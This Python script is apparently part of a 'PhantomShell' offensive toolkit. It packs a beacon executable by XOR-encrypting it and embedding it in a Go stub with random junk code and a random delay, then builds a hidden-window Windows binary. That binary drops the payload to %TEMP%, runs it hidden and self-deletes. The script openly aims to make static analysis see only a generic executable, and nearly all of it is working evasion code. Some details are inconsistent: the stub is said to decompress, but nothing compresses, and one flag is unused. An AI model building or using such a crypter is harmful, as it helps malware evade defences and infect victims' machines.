#!/usr/bin/env python3
"""
PhantomShell Custom XOR Packer
Takes a beacon.exe and wraps it in a self-extracting stub.

The stub:
  1. Waits a short random delay
  2. XOR-decrypts + decompresses the embedded payload
  3. Writes it to %TEMP% with a random name
  4. Executes via CreateProcess (hidden)
  5. Self-terminates

Usage:
    python packer.py --input beacon_v4.exe --output packed.exe
    python packer.py --input beacon_v4.exe --output packed.exe --keep-stub
"""

import os
import re
import sys
import uuid
import shutil
import random
import string
import hashlib
import argparse
import subprocess
import tempfile
from pathlib import Path

SCRIPT_DIR = Path(__file__).parent.resolve()
STUB_FILE  = SCRIPT_DIR / "stub.go"
OUTPUT_DIR = SCRIPT_DIR / "output"

GO_CANDIDATES = [
    "go",
    r"D:\Go\bin\go.exe",
    r"C:\Go\bin\go.exe",
    r"C:\Program Files\Go\bin\go.exe",
]


def find_go() -> Path:
    for c in GO_CANDIDATES:
        p = Path(c)
        try:
            r = subprocess.run([str(p), "version"], capture_output=True, text=True, timeout=5)
            if r.returncode == 0:
                return p
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    print("[-] Go compiler not found!")
    sys.exit(1)


def rand_ident(prefix: str = "x") -> str:
    return prefix + "".join(random.choices(string.ascii_letters, k=random.randint(6, 12)))


def rand_hex(n: int = 8) -> str:
    return "".join(random.choices("0123456789ABCDEF", k=n)).upper()


def pack(input_exe: Path, output_name: str, keep_stub: bool):
    if not input_exe.exists():
        print(f"[-] Input not found: {input_exe}")
        sys.exit(1)

    go = find_go()
    print(f"[+] Go    : {go}")

    # ── 1. Read + encrypt ──────────────────────────
    raw = input_exe.read_bytes()
    raw_size = len(raw)

    xor_key = bytes(random.randint(0, 255) for _ in range(64))
    encrypted = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(raw))

    enc_size = len(encrypted)
    input_hash = hashlib.sha256(raw).hexdigest()[:16]

    print(f"[*] Input  : {input_exe.name}")
    print(f"[*] Size   : {raw_size/1024:.1f} KB")
    print(f"[*] SHA256 : {input_hash}")
    print(f"[*] Method : XOR (64-byte key)")

    # ── 2. Generate payload byte arrays ───────────────
    # Convert to Go source format: 0x12, 0x34, ...
    payload_lines = []
    for i in range(0, len(encrypted), 16):
        chunk = encrypted[i:i+16]
        line = ", ".join(f"0x{b:02X}" for b in chunk)
        payload_lines.append(f"\t{line},")

    payload_str = "\n".join(payload_lines)
    key_str = ", ".join(f"0x{b:02X}" for b in xor_key)

    # ── 3. Read stub template ──────────────────────────
    if not STUB_FILE.exists():
        print(f"[-] Stub template not found: {STUB_FILE}")
        sys.exit(1)
    stub = STUB_FILE.read_text(encoding="utf-8")

    # ── 4. Fill template ───────────────────────────────
    seed = uuid.uuid4().hex
    replacements = {
        "{{RANDOM_HEADER}}":   f"Build: {random.randint(100000, 999999)} | Hash: {input_hash}",
        "{{RANDOM_BUILD_ID}}": f"ID: {seed[:16]}",
        "{{PAYLOAD_BYTES}}":   payload_str,
        "{{KEY_BYTES}}":       key_str,
        "{{BUILD_SEED}}":      seed,
        "{{JUNK_TYPE_1}}":     rand_ident("P"),
        "{{JUNK_TYPE_2}}":     rand_ident("P"),
        "{{JUNK_VAR_1}}":      rand_ident("j"),
        "{{JUNK_VAR_2}}":      rand_ident("j"),
        "{{JUNK_FUNC_1}}":     rand_ident("jf"),
        "{{JUNK_FUNC_2}}":     rand_ident("jf"),
        "{{JUNK_SIZE}}":       str(random.randint(64, 256)),
        "{{JUNK_SEED}}":       str(random.randint(1000, 99999)),
        "{{JUNK_LOOP}}":       str(random.randint(5, 20)),
        "{{JUNK_HASH}}":       str(random.randint(8, 16)),
        "{{JUNK_XOR}}":        rand_hex(8),
        "{{DELAY_MIN}}":       str(random.randint(5, 30)),
        "{{DELAY_RANGE}}":     str(random.randint(10, 60)),
        "{{NAME_LEN}}":        str(random.randint(6, 12)),
    }

    source = stub
    for k, v in replacements.items():
        source = source.replace(k, v)

    # ── 5. Compile ─────────────────────────────────────
    OUTPUT_DIR.mkdir(exist_ok=True)
    output_path = OUTPUT_DIR / output_name

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        go_file = tmp / "main.go"
        go_file.write_text(source, encoding="utf-8")

        # Init module
        subprocess.run(
            [str(go), "mod", "init", "packer"],
            cwd=str(tmp), capture_output=True, timeout=10
        )

        env = os.environ.copy()
        env["GOOS"]        = "windows"
        env["GOARCH"]      = "amd64"
        env["CGO_ENABLED"]  = "0"

        print(f"\n[*] Compiling packed stub...")
        print(f"    Source: ~{len(source)/1024:.0f} KB (payload embedded)")

        build_cmd = [
            str(go), "build",
            "-ldflags", "-s -w -H windowsgui",
            "-trimpath",
            "-o", str(tmp / "packed.exe"),
            str(go_file),
        ]

        result = subprocess.run(
            build_cmd, cwd=str(tmp), env=env,
            capture_output=True, text=True, timeout=120
        )

        if result.returncode != 0:
            print(f"[-] Build FAILED:")
            stderr = result.stderr[-2000:] if len(result.stderr) > 2000 else result.stderr
            print(stderr)
            sys.exit(1)

        built = tmp / "packed.exe"
        if not built.exists():
            print("[-] No output produced")
            sys.exit(1)

        shutil.copy2(built, output_path)

    # ── 6. Report ──────────────────────────────────────
    pack_size = output_path.stat().st_size / 1024
    pack_hash = hashlib.sha256(output_path.read_bytes()).hexdigest()[:16]

    print(f"\n{'='*60}")
    print(f"[+] PACK SUCCESS")
    print(f"    File    : {output_path}")
    print(f"    Size    : {pack_size:.1f} KB (inner: {raw_size/1024:.1f} KB)")
    print(f"    Ratio   : {pack_size/raw_size*1024:.0f}%")
    print(f"    Hash    : {pack_hash}")
    print(f"    Payload : {input_hash}")
    print(f"    Method  : XOR (64-byte random key)")
    print(f"\n[*] Static analysis sees: generic Go EXE + random junk code")
    print(f"[*] Runtime: decrypt → %TEMP% → CreateProcess → self-delete\n")


def main():
    p = argparse.ArgumentParser(description="PhantomShell XOR Packer")
    p.add_argument("--input",  required=True,          help="Beacon EXE to pack")
    p.add_argument("--output", default="packed.exe",   help="Output filename")
    p.add_argument("--keep-stub", action="store_true", help="Keep generated stub source")
    args = p.parse_args()
    pack(Path(args.input), args.output, args.keep_stub)


if __name__ == "__main__":
    main()
